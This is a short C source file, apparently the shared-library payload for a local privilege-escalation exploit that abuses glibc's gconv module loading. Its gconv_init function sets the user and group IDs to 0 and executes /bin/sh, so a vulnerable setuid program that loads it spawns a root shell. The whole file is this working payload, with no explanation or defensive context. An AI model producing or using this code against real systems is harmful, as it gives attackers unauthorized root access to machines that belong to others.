#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void gconv(void) {
}

void gconv_init(void *step)
{
	char * const args[] = { "/bin/sh", NULL };
	char * const environ[] = { "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/opt/bin", NULL };
	setuid(0);
	setgid(0);
	execve(args[0], args, environ);
	exit(0);
}
